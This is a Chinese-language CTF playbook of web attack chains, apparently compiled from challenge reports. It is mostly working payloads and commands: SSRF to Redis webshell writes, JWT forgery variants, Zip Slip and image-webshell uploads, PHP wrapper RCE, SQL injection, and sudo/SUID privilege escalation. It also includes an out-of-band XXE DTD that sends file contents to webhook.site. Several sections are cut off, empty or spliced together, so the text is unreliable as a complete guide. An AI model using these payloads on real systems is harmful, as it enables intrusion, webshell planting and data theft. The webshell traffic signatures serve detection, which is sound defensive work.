## 一、Web 渗透线

### 链 1：快照打 Redis 写马

- **认**：网站有"快照/抓取/下载"类功能，请求参数形如 `POST url=http://...`，服务端用 curl 抓取并回显；参数无协议白名单 → 内网 `127.0.0.1:6379` 存活且 Redis 为 3.2.6 类古董版本（无鉴权）。探测判据：`dict://127.0.0.1:6379/info` 回显 `redis_version:3.2.6` 即命中。
- **链**：
  1. 确认 SSRF 入口 → `POST url=http://127.0.0.1:8080/` 扫描内网端口，8080 等内网服务首页直接含 flag（447）→ 得到"服务端真的会发请求"的结论；
  2. 用 `dict://` 探测 Redis 并跑无特殊字符的命令 → `url=dict://127.0.0.1:6379/config set dir /var/www/html`；`?` 会被 curl 当 query 截断、`%XX` 在 dict 里不解码 → 所以**含特殊字符的命令必须换 gopher + %XX 全编码**；
  3. `CONFIG SET dir /var/www/html` → `CONFIG SET dbfilename xxxxxx.php` → `SET pwn "\x3c\x3f\x70\x68\x70..."`（PHP 内容用 `\xHH` 十六进制转义避开 URL 非法字符）→ `SAVE` → RDB 落盘成 PHP；
  4. `GET /xxxxxx.php?0=cat /tmp/flag.txt` → webshell 执行（木马形式 `<?php eval($_REQUEST[1]);?>` 或 `system($_GET[0])`）；
  5. 善后：删木马，并把 `CONFIG SET dir` / `dbfilename` 改回默认（报告记录改回 `/var/lib/re...`）。
- **算成**：`GET /<dbfilename>` 返回命令回显即通；RDB 写的 PHP 前面带 REDIS 二进制垃圾不影响执行，读到 `/tmp/flag.txt` 即拿 flag。
- **假点**：最容易卡在协议选择——`gopher` 在本题无回显（报"无法获取内容"）时**不是走不通，是改用 `dict://`**；`dict://` 用字面空格（`%20` 不解码）。若目标 Redis 有 `requirepass` 或绑定了外部网卡、或 `dir` 不可写，这条链不成立，替代路径：走 Redis 主从复制 RCE 或改打其它内网服务。回连型 payload（反弹 shell）在仅 HTTP 出网的环境不成立。`FLUSHALL` 会清库，测完要复原。
- **来源**：题 448（报告 155 行 / 424–434 行 / 1171 行 / 1580 行台账"黄金经验"）；关联 SSRF 变体题 73、85、279、282、447、490、491、492、493（报告 18–19 行、125–126 行、154 行、160–162 行、1168 行）。

### 链 2：泄漏凭据登后台

- **认**：登录页给出的报错文案可区分"用户不存在/密码错误"（如 401 `'用户名错误'` len43 vs 200 success len78），或页面明文写了默认口令提示（`password-hint`、`例如：admin`、默认口令 `88888888`）；后台路由 `/dashboard`、`/files`、`/admin`、`/user` 与普通用户视图渲染差异明显。
- **链**：
  1. `POST /login {username:CRED_USER_A,password:88888888}` → 200，判定为"用户存在"（len78）→ 枚举出可用普通账号；
  2. `GET /dashboard`（普通用户视图）→ 页面里的**系统日志区泄露管理员账号 `CRED_ADMIN`**（CWE-532）；
  3. `POST /login {username:CRED_ADMIN,password:88888888}` → 200，同一默认口令直接登管理员；
  4. `GET /dashboard`（管理员视图）→ 管理员视图才渲染 `flag-section` → 取 flag。
  另有同族两条更短的入口：`POST /login username=admin&password=123456` → 再 `GET /submit_vuln` 未授权接口返回 JSON 含 flag（题 88）；`POST /login username=admin&password=admin` → 302 `Location:/dashboard` → 登录后 `/files` 页面平铺通关密码（题 86）。
- **算成**：拿到管理员会话并看到普通视图不渲染的区块（flag-section）即通；判据是"同一路由在不同角色下响应体差异"，不是状态码。
- **假点**：`placeholder「例如：admin」可能是假的`（题 86 实测：真实凭据与页面提示不符，需换字典）；页面"测试账号"常是烟雾弹，真实凭据 = 任务目标名/admin（711 = `admin/admin`、712 = `system/123456`）。卡点还常见于**登录限速锁**：`「错误次数过多，请N秒后再试！」`注入在 POST 响应体（HTTP 200），会让 302/200 判定失真——各实例阈值不同（711≈17s 锁，712 需 3s 间隔），先单发验证判定词。走不通时的替代：转链 39（爆破纪律）或链 4（前端 JS 找隐藏接口）。
- **来源**：题 127（报告 108 行）、88（报告 21 行）、86（报告 106 行）、711/712（报告 1231 行、1657–1658 行）、452（报告 156 行）。

### 链 3：源码泄露到写马

- **认**：`GET /Dockerfile` 可直接下载（或目录索引开放），文件中含明文账号口令；后台存在插件/附件上传且参数形如 `?action=plugins`、`zipfile=`。
- **链**：
  1. `GET /Dockerfile` → 读出明文凭据 `CRED_USER:CRED_PASS`；
  2. `POST /admin/login.php username=CRED_USER&password=CRED_PASS` → 302 到 `index.php`，后台会话成立；
  3. `POST /admin/index.php?action=plugins` multipart 上传 `zipfile=p.zip`，zip 条目名带 `../` → **Zip Slip 任意文件写入**（第 85 行 `$targetPath=$uploadDir.$filename` 未过滤 `../`），落地目录 `../uploads/` 即 Web 根 `uploads/`；
  4. 内容黑名单（第 90 行 `preg_match('/(\$_GET|\$_POST|\$_REQUEST)/i')`）只匹配三个字面量 → 用 `eval(base64_decode(...))` 秒过（反引号 `` echo`id` `` 也能过）；
  5. `GET /uploads/<马>.php?c=cat /tmp/flag.txt` → RCE 执行。
- **算成**：Web 内 PHP 以 root（PHP 内置服务器）执行并回显 `/tmp/flag.txt` 即通；也可 `env` 直接读 `FLAG`/`GZCTF_FLAG`。
- **假点**：内容黑名单只拦字面量，别去硬绕它本身；真正卡点是**zip 条目名的相对路径深度**——写偏一层就落到 Web 根之外。若容器不给 `/Dockerfile`（404），替代路径：转链 4 用 `php://filter` 读源码、或 `?source=1` 泄露分支。若上传目录禁脚本执行，这条链断在最后一步。
- **来源**：题 895（报告 179 行）、895 同族题 229（报告 199 行，链断在"内容源不含原始 `<>`"）。

### 链 4：任意读读源码绕 WAF

- **认**：参数形如 `?file=`、`?read=`、`?include=`、`?url=`、`?source=1`，服务端对协议/路径做**字符串前缀黑名单**（`stripos(...)===0`、`strpos($a,'.')`），而不是解析后校验。
- **链**：
  1. 先用探针确认读原语 → `GET /?read=/tmp/flag.txt` 或 `GET /index.php?url=file:///tmp/flag.txt`（题 85/457）；
  2. 用伪协议读源码拿 WAF 逻辑 → `php://filter/convert.base64-encode/resource=index.php`（题 386 的破题点就是这个），或 `?source=1` 直接泄露 `index.php` 164–194 行（题 490/491）；
  3. 按读到的黑名单做等价变形 → 只匹配小写 `file://` 用 `FILE:///tmp/flag.txt`（491）、拦字面量 `file://` 用 `file:/tmp/flag.txt` 少一个斜杠（490）、拦 `file:..` 与 `file:///tmp` 用 `file:/tmp/flag.txt`（492）、拦 `php://data://..` 却漏 `file://` 就用 `file:///tmp/flag.txt`（390）；
  4. 输出关键词黑名单（拦 `flag` 字面量）→ 改 base64 回显：`php://filter/read=convert.base64-encode/resource=/tmp/flag.txt`，响应是 base64 **必须解码后再找 flag**（题 386/512 明确记录：直接正则找 flag 会误判失败）；
  5. 读不到 flag 时换路径：`/proc/self/root/tmp/flag.txt`、`/proc/1/root/...`、`glob://`。
- **算成**：读到源码即已"半通"——能读出 WAF 逻辑就说明任意读成立；读到 `/tmp/flag.txt` 内容（或 base64 解码后）即拿 flag。
- **假点**：**必须解码 base64 再判断**（题 386 响应 6379B 全 base64）；`?read=` 分支对一切输入都返回"不存在"（含 `favicon.png`）说明是**实例未初始化/环境缺陷**（题 458、459），别死磕，直接换实例或换题。`file:/` 单斜杠和 `file://127.0.0.1` 无效，`file:////`、`file://localhost/` 有效。`strpos` 类前缀判断只匹配字面量，等价写法往往比编码绕过更快。
- **来源**：题 386（报告 138 行）、490/491/492（报告 160–162 行）、390（报告 140 行）、512（报告 167 行）、85（报告 19 行）、457（报告 1635 行）、458/459（报告 1381–1382 行）；Flask `static_folder='.'` 导致 `/app.py` 泄露的同类题 786（报告 177 行）。

### 链 5：前端 JS 挖接口

- **认**：首页 `href` 全是 `#`、表单 `onsubmit=false`（不真提交），但页面里有 `fetch`/`XHR`/`onclick` 绑定；或响应头/404 页面暴露框架特征（Spring Boot、Flask、Werkzeug），存在 `/v2/api-docs`、`/swagger-resources`、`/actuator` 类文档端点。
- **链**：
  1. 读页面 JS 抠真实端点 → 例：`document.getElementById('address').onclick → fetch('/success')`（题 134）；`xhr.send: action=test&username=<SQL>`（题 348）；`fetch('/api/news')`（题 175）；`?action=execute_code&get_params=` 面板（题 205）；`POST /execute {"command":"..."}` 藏在首页 JS，表单 `onsubmit=false` 不提交（题 266）；
  2. 探接口文档 → `/swagger-resources` → `/v2/api-docs` 读出全部 paths（题 579）；
  3. 直连内部调试接口（**注意原路径直接调用，不要加 `/api` 前缀**）→ `GET /admin/internal/monitor/system/config/refresh/detail` 无需任何鉴权直接返回 flag；`/user/info` 同样无鉴权；
  4. 对隐藏 API 做匿名分页遍历 → 例 `/jbl/api/module-data/suplinkman_id/page`（题 107，PII 泄露已证实，flag 字段为空）。
- **算成**：无鉴权直连内部接口返回业务数据即通；本题走到第 3 步响应里直接就是 flag。走"信息泄露"路线时，判据是**分页能拿到真实记录**（题 107 拿到 15 行 PII），此时 flag 可能是空字段（`has_flag=0`），漏洞已证实但无分。
- **假点**：容器开启后**约 8 秒才监听**，需先轮询再打，否则全是连接拒绝（题 579 实测）；`/` 路径返回 404 JSON 是 Spring 的默认行为，不代表服务不在。判分接口要先读 JS 再打——报告把"判分接口字段靠猜"列为**第一号高危失败模式**（XSS 4 题因此浪费数小时）。若目标把所有 `/admin/*` 限成 `remote_addr=127.0.0.1`，转链 15（SSRF 内网跳板）或链 18。
- **来源**：题 579（报告 60 行 / 1244 行 / 1634 行）、134（报告 1597 行）、348（报告 43 行 / 1583 行）、175/176/84/169/195（报告 1537–1540 行、80–81 行、1651 行）、107/113/135（报告 1414 行、1635 行、1598 行）、266（报告 123 行）、205/228/230（报告 115–122 行）。

### 链 6：JWT 伪造六打法

- **认**：Cookie/Authorization 里是 `eyJ...` 三段式；先 base64 解 header：`alg` 为 `HS256` 要求有可猜/可取的对称密钥，为 `RS256` 且存在 `/jwks.json` 则是算法混淆候选；header 里出现 `kid`、`jku`、`jwk` 是注入候选。辅助判据：**jku 指向不可达 IP，响应时间 0.12s → 5.1s，一次请求即可确认服务端真的去远程拉取**。
- **链**：按"服务端到底校验了什么"分五种，判断顺序从便宜到贵。
  1. 先试"完全不验签" → 改 `role=admin`，签名段直接填 `AAAA`（题 788/418，`alg:none` 被拒但伪造签名通过，反证只没验签）；
  2. 再试 `alg:none` → header `{"alg":"none"}`（`None`/`NONE` 都行），**末尾 `.` 必须保留**（题 408）；
  3. 弱密钥爆破 → HS256 离线 HMAC：`SecLists xato-net-10-million-passwords-100000` 里 0.03s 命中 `CRED`（题 392；小字典 top10k 不够，第一次开实例就是没用 10 万字典而没打通）；
  4. 算法混淆 RS256→HS256 → `GET /jwks.json` 取 `n/e` → 生成 PEM（PKCS1/SPKI/DER/去头尾 base64 **都能命中**）→ 用公钥内容当 HMAC 密钥签 admin token（题 419）；
  5. `kid` 路径遍历 → `"kid":"../../../../dev/null"` 读到空文件，用空字符串当 HMAC 密钥签名即过（题 441，`/dev/null` 或 `../../../../dev/null` 均可）；
  6. `jku` 头注入 → 指向自建 JWKS，用自建 RSA2048 私钥 RS256 签 admin；**关键难点是本机 NAT 无法回调，须用公网静态托管**（payload 上传 paste.rs，`text/plain` 也能被 `resp.json()` 解析）（题 425）。
  7. 拿到 admin 令牌后访问 `/profile` → 很多题到这一步就已经返回 flag；392 还需要再提交"爆破出的密钥本身"（同样是 AES-CBC 加密的 JSON body 提交到 `/admin`）。
- **算成**：`GET /profile`（或 `/admin`）以 admin 身份 200 且返回 flag 即通。判据是"伪造后的 token 能过服务端校验并提升角色"，不是签名格式正确。
- **假点**：同批 6 题登录包共用同一套**前端硬编码 AES**（key/IV 写在 `encrypt.js` 里，`CRED_AES_KEY` 32 字节 + `CRED_AES_IV` 16 字节）→ 先复刻前端加密再登录，别在登录层硬碰。每条打法失败都要换下一条，**不要在同一种上反复试**：`alg:none` 被拒不代表没洞（418 证明只没验签）；`kid` 试 `/proc/self/environ` 等路径不通过说明只有空文件可用。走不通时：转链 2（拿合法账号再越权）或链 38（IDOR）。
- **来源**：题 788/418（报告 178 行 / 147 行）、408（报告 146 行）、392（报告 141 行）、419（报告 148 行）、441（报告 152 行）、425（报告 150 行 / 1170 行）；汇总表在报告 1198–1205 行、792–799 行。

### 链 7：图片马配包含

- **认**：站点同时有上传点和 `include` 类参数（`?include=`、`?page=`、`?file=`）；上传处只校验图片类型（`getimagesize` 类）、无二次渲染；`include` 参数**只接受纯文件名**（带 `uploads/` 路径、绝对路径、穿越全部失败 → 说明后端是 `basename()` + 固定 `uploads` 前缀）。
- **链**：
  1. 上传真图片马 → 内容 `GIF89a<?php echo file_get_contents('/tmp/flag.txt');?>`（或完整 PNG 的 IHDR/IDAT/IEND + 尾部 PHP；**要求真图片，伪头不够**，343 台账记录含 php 的 png 被 include 时先输出 PNG 头再执行）；
  2. 接口把后缀强制改成 UUID.png → 无所谓，**`include` 不看后缀**；
  3. `GET /index.php?include=<uuid>.png` → 必须**只填纯文件名**，带路径全部失败；
  4. 用哨兵串（如 `===PWN===`）确认代码真的执行，而不是把源文件当文本回显；
  5. 执行成功后直接读 `/tmp/flag.txt`（或 `cat`）。
- **算成**：哨兵串出现在响应里即证明 PHP 被执行 → 同一请求里读 flag 即可。
- **假点**：最容易卡两点：① 上传校验要求真图片结构，伪头不够；② `include` 参数不吃路径，很多人一直在试 `uploads/xxx.png` 和穿越，**换成纯文件名立刻通**。若上传目录禁脚本执行，这条链不成立，替代路径：转链 8（反序列化写文件）或链 3（Zip Slip 写马）。
- **来源**：题 343（报告 41 行 / 1581 行台账）、题 344/345/346（报告 42 行、132–133 行）、题 895（报告 179 行，Zip Slip 变体）。

### 链 8：上传绕过七层

- **认**：上传接口的校验层次可直接从响应推断——只改一个头就过 = 仅客户端/MIME 校验；白名单报错回显黑名单内容（`.asp,.aspx,.php,.jsp`）= 不完整黑名单；落地名被时间戳/UUID 重命名 = 必须以响应回显路径访问。
- **链**：按"校验层次"从弱到强，逐层攻破，报告 1136–1152 行原表。
  1. **无校验** → 直传 `shell.php`，落地 `/uploads/` 可解析（196/197）；
  2. **仅前端 JS 正则**（`/(\.png|\.jpg|\.jpeg)$/i` 只在浏览器侧）→ 抓包直传（201）；
  3. **仅校验 multipart 的 `Content-Type`** → 只改 part 头 `Content-Type: image/png`，**必须带 `submit` 字段否则逻辑不触发**（202/203，关键坑：不带 submit 时 msgBox 全空，容易误判"没漏洞"）；
  4. **后缀黑名单不全** → `.php5` / `.phtml` / `.php7`（Apache PHP 模块注册别名，218/219）；
  5. **黑名单 + 只校验文件名（单次非递归 str_replace）** → 双写 `shell.pphphp` → 落地 `ell.php`（269；**落地名被去首字符，必须以响应回显路径访问**；过滤对大小写敏感，`shell.PHP` 被拦）；

- **假点**：**Adminer 失败登录约 31 次锁 30 分钟，锁按 `REMOTE_ADDR` 判定**（换 session/UA/XFF 全无效）→ host 枚举预算必须 ≤25 次并提前内定优先级，被锁只能重开靶场换容器。该题 `has_flag=0`（平台未登记 flag），打通也没分，别误判为失败。
- **来源**：题 170（报告 218 行 / 556–558 行 / 1252 行 / 1407 行 / 1584 行）；同族 SSRF 通道题 168（报告 1645–1646 行，"host 枚举触发 30min 锁"）。

### 链 19：CXF 实体读文件

- **认**：目标是 Apache CXF（Aegis DataBinding）；接口形如 `POST /test`，接受 SOAP 信封；版本落在 CVE-2024-28752 影响范围。

### 链 20：sudo 白名单提权

- **认**：先有 Web RCE（一句话木马，形如 `POST /index.php a=system('id')`）；`sudo -l` 有输出。
- **链**：先拿 Web RCE，再按 `sudo -l` 起步，三种分支。
  1. `sudo -l` → 见 `(ALL) NOPASSWD: /bin/su` → `sudo -n /bin/su -c 'cat /root/flag.txt'` 直接 root（题 293）；
  2. `sudo -l` → 白名单给了**解释器** `(root) NOPASSWD: /usr/local/bin/php` → `sudo -n /usr/local/bin/php -r 'echo file_get_contents("/root/flag.txt");'`（**给解释器 = 给 root**；本题 `disable_functions`/`open_basedir` 均未设置）（题 294）；
  3. `sudo -l` → 授权执行**一个默认不存在的文件**（如 `/var/www/html/SUDO_TARGET.html`），且该目录 `www-data` 可写（`drwxrwxrwt`）→ `file_put_contents('/var/www/html/SUDO_TARGET.html','#!/bin/sh\nid\ncat /root/flag.txt\n')` → `chmod 755` → `sudo -n /var/www/html/SUDO_TARGET.html` 以 root 执行（题 295）。
- **算成**：`id` 返回 root 且读到 `/root/flag.txt` 即通。
- **假点**：分支 3 的坑：**sudo 不走 shell 兜底，文件必须 `chmod +x`**，否则报 `command not found`，非常容易误判成"文件不存在"而放弃。分支 2 若 `disable_functions` 禁了 `file_get_contents` 要用 `php -r` 里可用的其它函数。`sudo -l` 无有价值条目时转链 21（SUID）。
- **来源**：题 293/294/295（报告 127/128/129 行 / 815–818 行 / 1264 行）。

### 链 21：SUID 九连提权

- **认**：已拿到普通 shell；`find / -perm -4000 -type f 2>/dev/null` 的结果里**挑非标准项**（异常项就是答案）。
- **链**：GTFOBins 逐个套用，全部实证通关。
  1. `/usr/bin/nl` 带 SUID（异常项）→ `nl /root/flag.txt` 直接读（题 472）；
  2. `/usr/bin/nice` → `nice /bin/sh -p` → euid=0 → `cat /root/flag.txt`（nice 本身被削 niceness，但 `-p` 保留 euid=0）（题 473）；

  4. `/usr/bin/mawk` → `mawk '//' /root/flag.txt`（程序体 `//` 匹配所有行打印）（题 477）；

### 链 22：伪协议包含 RCE

- **认**：`include` 参数完全可控；用探针确认 `allow_url_include=On`（如 `data://text/plain;base64,PD9waHAgZWNobyA3Kjc7Pz4=` 回显 49）；WAF 往往是**关键字黑名单**而非白名单。
- **链**：按 WAF 放行哪一个协议选打法，三种 RCE 姿势。
  1. 先读源码拿 WAF 逻辑：`php://filter/convert.base64-encode/resource=index.php`；
  2. **`php://input`** → `POST /?include=php://input`，body 放裸 PHP 代码（`<?php system('id');echo file_get_contents('/tmp/flag.txt');?>`），include 可回显，`id=www-data`（题 389）；
  3. **`data://`** → `data://text/plain;base64,<base64(<?php echo file_get_contents('/tmp/flag.txt');?>)>`（base64 版最稳）；WAF 只放行**小写** `data://`，`DATA` 大写被拦（题 394）；
  4. **`http://` RFI** → `GET /?include=http://paste.rs/<payload>`；WAF 只放行小写 `http://`；`https://` 被拦但 **http 入参 + 302 跳 https 可绕**；本机 NAT 不可回连时把裸 PHP 托管到公网 paste（题 399）；
  5. 纯路径穿越绕过：前缀拼接 + 单次过滤 → `....//....//....//....//tmp/flag.txt`（`str_replace('../')` 只做一次，`....//` 被删 `../` 后剩 `../`）（题 346）；递增 `..` 层数到 4 层到根（题 345）。
- **算成**：`id`/`phpinfo` 回显即证明代码执行成立（389 响应 93KB 的 phpinfo、394 探针回显 49 都是判据）；同一包含点读到 `/tmp/flag.txt` 即拿 flag。
- **假点**：三类高频坑——① **`?include=` 前缀拼接**时绝对路径被堵死，必须用 `..` 层数或伪协议；② 大小写敏感的黑名单（只放行小写 `data://`/`http://`）会让"明明协议对却失败"，别在大写上浪费时间；③ 如果 `include` 分支对一切输入（含 `favicon.png`）都返回 NF，是**实例未初始化**（题 346/458/459 同现象），换实例或换题。`zip://` 放行但回显恒 0 字节说明 `php-zip` 未加载（题 393）。
- **来源**：题 344/345/346/385/386/389/390/392/394/399（报告 41–42 行、132–143 行、1154–1164 行）；未攻克对照 393（报告 202 行）。

### 链 23：XXE 三态与盲打

- **认**：接口接受 XML——三种承载位置**必须逐个试**：raw body（`Content-Type: application/xml`）、表单参数（`xml=`）、嵌入 JSON。这是本类题最费时点。
- **链**：
  1. 有回显基础 payload：`<?xml version="1.0"?><!DOCTYPE d [<!ENTITY x SYSTEM "file:///tmp/flag.txt">]><d>&x;</d>`，且实体**必须嵌进后端预期的节点结构**（如 `<data><username>&xxe;</username></data>`）才会被渲染（304/508）；
  2. WAF 只拦 `file:` → 换伪协议 `php://filter/read=convert.base64-encode/resource=/tmp/flag.txt`（510）；
  3. WAF 按 UTF-8 字符串拦 `<!ENTITY` → **整段用 UTF-16 重编码**（`encoding="UTF-16"`，LE/BE ±BOM 均可），libxml 正常解析并回显明文（509）；
  4. 输出关键词黑名单（拦 `flag`）→ 用 `php://filter` base64 回显再本地解码（512）；
  5. 无回显时盲打 OOB（511）：外部 DTD + 参数实体三段式，把 base64 内容接到公网：
     ```
     <!DOCTYPE d [<!ENTITY % r SYSTEM "https://paste.rs/<dtd>">%r;]><d>x</d>
     <!-- 外链 DTD -->
     <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/tmp/flag.txt">
     <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/<uuid>/b64/%file;'>">
     %eval;%exfil;
     ```
     容器可出公网 → webhook.site 取 uuid 做收件箱，paste.rs 托管恶意 DTD → webhook 收到 `.../b64/<b64>` 解码即 flag。
- **算成**：有回显分支"目标节点里渲染出文件内容"即通；盲打分支"webhook 收到 base64 分片"即通（有无回显是两条不同判据）。
- **假点**：**承载位置猜错就永远无回显**——报告明确这是本类题最费时的点（raw body vs 表单参数 vs 嵌入 JSON 三种）。入口参数名必须对（509 记录"参数名必须是 `xml`"）。盲打必须确认容器能出公网，否则换外带通道或放弃。
- **来源**：题 304/508/509/510/511/512（报告 32 行、163–167 行、1174–1181 行）。

### 链 24：注入分段外带

- **认**：`'` 看报错 → `1 and 1=1 / 1 and 1=2` 看差异 → `order by n` 定列数；回显报错里能反推闭合结构（**黑盒最快路径**：从 `near ''1'')'` 反推外层包裹是 `(name='INPUT')`）。注入点在 body 时 `Content-Type: application/x-www-form-urlencoded`，payload 与 GET 同一套。
- **链**：
  1. 定列数 → 数字型 `0 union select 1,2,3,4,5` → `0 union select 1,group_concat(flag),3,4,5 from flag`（题 106）；
  2. 字符型报错注入 → `1' and extractvalue(1,concat(0x7e,(select substr(flag,1,16) from flag limit 0,1)))-- -`，`updatexml` 互为备份（题 108/191）；
  3. **报错串 32 字节截断 → 必须 `substr(flag,1,16)` 分 16 字符多段拼接**（三段拼出完整 flag）；
  4. 关键字黑名单（`and/or/union/order by/having` 被剔除，大小写/注释/TAB 分隔全被删）→ **MariaDB 用 `||` 代 `or`、`&&` 代 `and`**：`1'||extractvalue(1,concat(0x7e,(select substr(flag,1,16) from flag limit 0,1)))||'1'='1`；过滤信号 = 报错停在 `near ''`（内容被删空）；其它绕过：`/**/` 代空格、`AnD` 大小写、`selselectect` 双写、`%0a`、`+`（题 185）；
  5. 只有 1 bit 信道时 → 布尔盲注 `ascii(substr(...))>N` 二分（题 109，`bool_blind.py` 约 100 请求）；时间盲注 `if(...,sleep(1.2),0)`，**阈值必须与 sleep 时长匹配**（1.2s sleep 配 2.0s 阈值导致全错），**等值法 + 全字母表逐位匹配优于二分**（抗网络抖动），开跑前先验证已知前缀 `flag{`（题 111）；
  6. `ORDER BY` 后注入 → `ORDER BY (select extractvalue(1,concat(0x7e,substr((select flag),pos,len))))`（题 112）。
  7. 拿到数据库凭据后的延伸：dump 出的口令**复用登录后台**（这是本链"多环"的收尾环）。
- **算成**：报错/回显出现 `.0x7e` 包裹的分段内容即注入成立；**拼出完整 flag** 或 dump 出可复用凭据登录后台即算整链走通。
- **假点**：两个坑——① 枚举 `information_schema` **必须 `ORDER BY + LIMIT`**，否则顺序不定；② **flag 列常带尾随空白，必须 `TRIM()`**，否则 `length()` 判断恒假（题 109 实测）。引导关无 flag 型（题 668）：注入全通、8 表 27 字段全 dump 无 flag、DB 账号无 FILE 权限（`load_file` 全 NULL、`into outfile` 1045）、不可堆叠 → **flag 在引导通关链路上发放，不在数据库里**，这类题不要死磕数据库。另一条止损线：`/flag` 可能是 TEST 占位假 flag，真 flag 在容器 `/tmp/flag.txt`（GZCTF 风格），拿到 shell 先按动态 flag 思路找。
- **来源**：题 106/108/109/111/112/185/186/191/668（报告 22–27 行、77–78 行、111 行、118 行、153 行、94 行、1110–1121 行、1593 行）；假 flag 坑记录于题 97（报告 1549 行）。

### 链 25：CSRF 代管理员

- **认**：关键状态变更接口（`transfer.php?to_user=&amount=`）**无 CSRF token、无 Referer 校验**；同时存在"留言/反馈/提交"类功能，其内容被当 URL 解析。判据：源码里 `if($['path']='transfer.php')` 这种**赋值 bug**（本意是 `==`）就是入口。

### 链 26：验证码缺陷登录

- **认**：登录/注册链路有验证码或短信验证码；先看响应结构（`{captcha_image, session_id}`、`/send` 的 JSON 里是否直接回显 `code`）；注意 `\d` 在 Python 里是 **Unicode 感知**（全角/阿拉伯数字可过）。

  4. **验证码回显** → `/send` 响应 JSON 直接回显 `code=702947` → 用该 code 登录（题 64/115）；
  5. **短信轰炸 + 未授权回显** → `POST /send {phone:18888888888,13800138000}` 逗号分隔多号码批量分发；`GET /getSend` 未授权明文回显最近一次验证码 → 登录任一手机号（题 1003）；
  6. **零格式校验 + 号码串当用户名** → `phone` 原始串当 key，用逗号号码串当用户名登录，`code` 用 `/getSend` 拿到的码（题 1068）；
  7. **找回密码爆破** → `/send_captcha` 只回显验证码**前 2 位** + 会话绑定 → 爆破后 2 位（第 91 次命中）→ 重置任意用户密码 → 登录 dashboard 拿 flag（题 654）；**坑：reset 必须同 CookieJar；判定词在 `div.error`，页面静态 `alert('请先输入用户名')` 是干扰项**；
  8. **重置接口漏校验** → `reset-password` 不校验 `verification_code`，只需 `username/new_password/confirm_password` 直接改密（题 69，字段名要从页面 JS 抠）。
- **算成**：登录成功并进入 flag 可见页面即通；"任意手机号可登录"、"任意用户密码可重置"本身就是链通证明。
- **假点**：**单号码 `/send` 不刷新 `getSend` 收件箱**（读到旧码必失败），必须用逗号多号码让本次码写进收件箱，且登录 `phone` 必须与 `/send` 的**原始串完全一致**（题 1068 关键坑）。验证码爆破 6 位顺序数字可能不成立（题 116 的 `000000-1002999` 爆破未中）。走不通时转链 39（口令爆破纪律）或链 2（找凭据）。

### 链 27：支付逻辑薅羊毛

- **认**：商城/充值/优惠券/会员类业务；关注**金额字段的取值口径**（前端传还是服务端算）、**符号**（是否校验正数）、**精度**（入账口径与判定口径是否一致）、**次数**（是否有一次性校验）。
- **链**：四类缺陷，实证题目。
  1. **前端可控价格** → `POST /checkout -H Content-Type:application/json -d {"items":[{"product_id":"iMac","quantity":1,"price":0.01,"name":"iMac"}]}`；正常价返回 `total:44900`（余额不足），`price` 改 `0.01`/`0`/`-44900` 均直接回显 flag（题 65）；

### 链 30：VCS 备份藏马

- **认**：根目录有目录索引开放；探测 `/.svn/`、`/.git/`、`/CVS/`、`/backup.zip`、`/www.zip`；区分 SVN 版本（1.6 用 `entries`，1.7+ 用 `wc.db`）。

### 链 31：流量认马五家族

- **认**：pcap/pcapng 里出现 `POST /xxx.php` 且 body 是高熵或固定结构；先 `strings pcap | grep -iE "flag|pass|key"` 快速命中明文家族。
- **链**：五大 webshell 家族特征对照，可直接抄进速查卡。
  1. **菜刀 China Chopper** → `POST /hbc.php`，CT `application/x-www-form-urlencoded`，参数 `pass=hbc&z0=...&z1=whoami`，**明文命令回显**（`strings` 即得）（题 1132）；
  2. **冰蝎 Behinder** → UA `Java/1.8.0_202`、CT `application/octet-stream`、参数 `rebeyond=<Base64(AES)>&v=4&rid=xxx`，响应有**固定 16 字节头 + AES 密文**；默认 key = `md5("rebeyond")[:16]` = `e45e329feb5d925b`（题 1133）；
  3. **蚁剑 AntSword** → UA `antSword/v2.1 ...`，参数 `ant=<Base64>&_cmd=<b64>`，响应含 `AS####BEGIN/END` 分隔符；**参数 = `substr(前2位随机字符) + base64`**，签名 `|||asline|||`、`antsystem`（题 1134）；
  4. **哥斯拉 Godzilla** → UA `...GodzillaClient/4.0`（常伪造 XFF），参数 `pass=<b64 功能|payload|key>&mode=1&charset=UTF-8`，响应 `##GODZILLA_RESPONSE_BEGIN/END##`（题 1135）；
  5. **自定义/换皮** → 伪装业务路径 `/upload/cache/img.php`，带 `X-Requested-With`、`token=<32hex>&data=<b64>&v=2&fmt=raw`，自定义标记 `CUSTOM_WS_BEGIN/END`（题 1136）；
  6. **统计与定位** → 统计 `POST /*.php` 次数与 body 参数名；**区分真实攻击源与伪造：XFF 可伪造，要看 TCP 五元组**（1135 真源 `ATTACKER_IP → VICTIM_IP`）；
  7. 还原攻击链 → 定位木马路径与执行的命令 → 交出 flag / 还原被删内容。
  另有 RSA 编码器特例（题 633）：编码器是"**私钥加密 → 服务端 `openssl_public_decrypt`**"，拿到 webshell 里嵌的公钥即可 `m = c^e mod n` 剥 PKCS#1 填充，**无需私钥全量解密**；命令藏在随机名参数的 **2 字符前缀后 base64**；配套 `decrypted_shell.txt` 全量解密记录。
- **算成**：能指名家族 + 拿到真实源 IP + 还原出执行的命令（或写出解密后的 payload）即通；答题卡式题要"答案格式严格匹配"（1133 的 Q17 必须答 `Cache-Control: no-cache` 带值；1135 的 Q14/Q15 不要带 `##` 标记）。
- **假点**：三个坑——① **`X-Forwarded-For` 是伪造的，别把伪造 IP 当攻击源**，必须看 TCP 五元组；② **pcapng 解析坑：大量 TSO 包 IP total length=0 会导致丢包，必须用实际长度兜底**（报告为此写了 `tools/pcapng.py`）；③ 附件是 pcapng 时 `linktype` 值要正确解读（220=usbmon、228=纯 IPv4 无以太网头）。拿不到附件时（附件只在网页端挑战页、API 无附件）：套用同族解密工具链或放弃（题 634）。
- **来源**：题 1132–1136（报告 185–189 行、588–602 行、1281–1295 行）、633（报告 61 行、851 行、1295 行）、634（报告 144 行 / 1591 行）。

### 链 33：隐蔽信道解码

- **认**：流量题先定信道类型（ICMP / DNS / USB-HID / HTTP / 无线），再定解码链（hex / base64 / base91 / ASCII / 7bit）。先跑 `strings + file + 长度/端口/协议分布统计` 再决定深度解析方向。
- **链**：按信道类型，全部实证。
  1. **ICMP 载荷文本** → 载荷形如 `Packet N: Value X`，按 `N` 排序后 `chr(V)` 拼接（21 个包）；噪声里混随机 base64 与 `Test data` 要滤掉；`linktype=228` 表示纯 IPv4 无以太网头（题 548）；
